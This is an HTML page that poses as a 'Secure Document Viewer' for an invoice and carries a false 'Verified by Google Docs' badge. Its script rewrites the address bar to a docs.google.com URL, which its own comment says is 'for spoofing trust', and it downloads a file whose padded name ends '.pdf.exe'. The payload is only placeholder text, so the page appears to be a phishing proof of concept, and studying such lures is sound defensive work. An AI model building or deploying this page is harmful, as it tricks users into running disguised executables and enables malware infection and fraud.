<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Document Viewer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      padding: 40px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
      text-align: center;
    }
    .button {
      padding: 12px 24px;
      background-color: #1a73e8;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 20px;
    }
    .button:hover {
      background-color: #0c5bd4;
    }
    .note {
      font-size: 14px;
      color: #555;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Secure Document Viewer</h2>
    <p>Click below to securely download your invoice document.</p>
    <button class="button" onclick="triggerDownload()">Download secure_invoice.pdf</button>
    <p class="note">Verified by Google Docs</p>
  </div>

  <script>
    function triggerDownload() {
      // Simulate redirect from docs.google.com (for spoofing trust)
      history.pushState({}, '', 'https://docs.google.com/viewer?embedded=true');

      // Create fake PDF-EXE filename
      const longName = "secure_invoice_2024_verified_document______________________________.pdf.exe";
      const blob = new Blob(["This is a test executable disguised as a PDF"], { type: "application/octet-stream" });
      const link = document.createElement("a");
      link.href = URL.createObjectURL(blob);
      link.download = longName;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  </script>
</body>
</html>
